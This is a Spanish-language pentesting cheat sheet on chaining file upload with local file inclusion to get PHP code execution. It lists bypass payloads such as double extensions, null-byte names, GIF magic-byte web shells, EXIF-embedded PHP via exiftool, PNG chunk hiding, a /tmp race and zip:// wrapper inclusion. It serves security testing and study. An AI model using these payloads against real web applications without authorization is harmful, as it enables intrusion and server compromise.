---
aliases: null
tags:
  - type/technique
  - vuln/lfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[File Inclusion]]'
---
# LFI To RCE - File Upload + LFI

***

## Cheatsheet

|               **Técnica**                |                                         **Descripción**                                         |                                        **Payload**                                        |
|:----------------------------------------:|:-----------------------------------------------------------------------------------------------:|:-----------------------------------------------------------------------------------------:|
|       <br>**Upload directo + LFI**       |                     <br>Subir un .php y luego incluirlo con el LFI<br><br>                      |            <br>Upload: `shell.php` → LFI: `/var/www/uploads/shell.php`<br><br>            |
|         <br>**Extensión doble**          |                  <br>Evadir filtro de extensión usando doble extensión<br><br>                  |                <br>Upload: `shell.php.jpg` → LFI al archivo subido<br><br>                |
|      <br>**Extensión alternativa**       |             <br>Usar extensiones PHP alternativas que no estén en blacklist<br><br>             |               <br>Upload: `shell.phtml`, `.phar`, `.phps`, `.php5`<br><br>                |
|       <br>**Null byte en nombre**        |             <br>Truncar la extensión con null byte en el nombre del archivo<br><br>             |                          <br>Upload: `shell.php%00.jpg`<br><br>                           |
|       <br>**Content-Type bypass**        |          <br>Cambiar el Content-Type a uno permitido manteniendo contenido PHP<br><br>          |                  <br>Content-Type: `image/jpeg` + contenido PHP<br><br>                   |
|        <br>**Magic bytes + PHP**         |               <br>Agregar magic bytes de imagen al inicio del archivo PHP<br><br>               |                <br>`GIF89a<?php system('id'); ?>` como `shell.gif`<br><br>                |
|       <br>**PHP en metadata EXIF**       |                   <br>Inyectar código PHP en los metadatos de una imagen real                   |   <br>`exiftool -Comment='<?php system("id"); ?>' image.jpg` → LFI a la imagen<br><br>    |
| <br>**PHP en chunk IDAT de PNG**<br><br> |                    <br>Esconder código PHP dentro de un chunk válido de PNG                     |                      <br>Payload en IDAT → LFI al PNG subido<br><br>                      |
|     <br>**Upload a /tmp + LFI race**     | <br>Aprovechar el archivo temporal que PHP crea durante el upload antes de que se borre<br><br> |                  <br>LFI a `/tmp/php<random>` con race condition<br><br>                  |
|       <br>**ZIP upload + wrapper**       |                   <br>Subir un ZIP con un .php adentro y accederlo via zip://                   | <br>Upload: `payload.zip` → LFI: `zip:///var/www/uploads/payload.zip%23shell.php`<br><br> |
^lfi-fileupload

***

## Overview

Esta técnica combina dos funcionalidades: un file upload (incluso si tiene validaciones) y un LFI existente. La idea es subir un archivo que contenga código PHP oculto o disfrazado, y después usar el LFI para incluirlo y ejecutarlo. El desafío principal está en bypassear las validaciones del upload (extensión, Content-Type, magic bytes, re-renderización de imágenes) y en conocer la ruta donde se almacena el archivo subido. La variante con race condition sobre archivos temporales en `/tmp` es especialmente útil cuando el servidor no guarda el archivo permanentemente, pero requiere velocidad y timing preciso.

***

## Notas Relacionadas


***
